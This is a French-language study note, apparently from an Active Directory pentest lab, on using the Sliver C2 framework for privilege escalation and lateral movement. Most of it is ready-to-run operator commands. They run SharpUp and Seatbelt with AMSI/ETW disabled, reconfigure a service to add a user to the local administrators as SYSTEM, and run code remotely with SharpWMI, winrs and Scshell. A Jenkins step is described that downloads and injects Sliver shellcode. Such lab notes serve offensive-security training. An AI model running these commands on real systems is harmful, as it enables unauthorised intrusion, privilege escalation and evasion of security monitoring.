# Sliver - Privesc et lateral

> [!summary] Objectif
> Élever ses privilèges localement puis se déplacer dans le domaine sans PowerShell : détecter les faiblesses (**SharpUp**, **Seatbelt** via **Stracciatella**), exécuter comme SYSTEM via des services (**Scshell** / **remote-sc-***), repérer où l'on est admin (**LACheck**), et exécuter à distance (WMI, `winrs`, BOF `sa-*`). Théorie : [[Attaques AD]].

> [!warning]- Required
> Une session sur la machine cible pour la privesc locale. Pour le mouvement latéral par service : des creds/tickets valides sur la cible (voir [[Sliver - Kerberos et tickets]]).

### Détecter une privesc locale (SharpUp / Seatbelt)

```bash
[server] sliver (dcorp-std_https) > armory install sharpup
execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/SharpUp.exe' 'audit'

# Seatbelt via Stracciatella (runspace sans AMSI/ETW)
execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/Seatbelt.exe' '-group=all'
```

SharpUp cherche les services non quotés, permissions faibles, unattended files. Stracciatella exécute Seatbelt dans un runspace PowerShell patché (AMSI/ETW/logging désactivés).

### Élever via un service vulnérable (remote-sc-*)

```bash
# Reconfigurer un service pour exécuter une commande en SYSTEM
[server] sliver (dcorp-std_https) > remote-sc-config -t 100 "" 'AbyssWebServer' 'C:\windows\system32\net.exe localgroup administrators dcorp\studentX /add' 1 2
[server] sliver (dcorp-std_https) > remote-sc-start "" 'AbyssWebServer'
[server] sliver (dcorp-std_https) > remote-sc-stop  "" 'AbyssWebServer'
```

Les modules `remote-sc-*` (BOF COFF-loader) reconfigurent/redémarrent un service distant pour exécuter une commande arbitraire dans son contexte (souvent SYSTEM). `sa-sc-enum` énumère les services au préalable.

### Repérer où l'on est admin (LACheck)

```bash
execute-assembly -p explorer.exe -t 60 '/mnt/c/AD/Tools/Sliver/LACheck.exe' 'smb /targets:all /threads:10'
```

LACheck teste l'accès admin local sur un ensemble de machines (dérivée d'admin local = chemin latéral). Croiser avec BloodHound.

### Exécution à distance (WMI, winrs, Scshell)

```bash
# WMI (sharp-wmi)
execute-assembly -i -M -E -t 45 '/mnt/c/AD/Tools/Sliver/SharpWMI.exe' 'action=exec computername=dcorp-mgmt command="..."'

# winrs via la commande execute native
[server] sliver (dcorp-std_https) > execute -o winrs -r:dcorp-mgmt cmd /c "whoami"

# Scshell (mouvement latéral par ChangeServiceConfig, sans créer de service)
[server] sliver (dcorp-std_https) > scshell dcorp-mgmt XblAuthManager
```

Scshell détourne un service existant (ex. `XblAuthManager`) pour exécuter du code sans en créer un nouveau (plus discret que PsExec). Après un `s4u`/OverPass, `winrs` réutilise le ticket injecté.

### Abus de Jenkins (dcorp-ci)

```bash
# RCE via la console de script Jenkins → invoquer le shellcode Sliver hébergé
# (Groovy) : télécharge dcorp-std_https.bin et l'injecte, comme le foothold initial
```

Jenkins sur `dcorp-ci` permet d'exécuter du Groovy → on rejoue la technique du foothold (BinLoader + shellcode) pour obtenir un beacon dans le contexte du service, souvent privilégié.

> [!note] Enchaînement type
> SharpUp/Seatbelt (repérer) → remote-sc-* / Scshell (exécuter en SYSTEM) → LACheck (trouver la prochaine machine) → dump de secrets (voir [[Sliver - AD CS, SQL et persistance]]) → OverPass-the-Hash → recommencer.

## Related
- [[Attaques AD]]
- [[Sliver - Kerberos et tickets]]
- [[Sliver - Delegation et RBCD]]
- [[Sliver - AD CS, SQL et persistance]]
- [[Sliver - Toutes les commandes]]
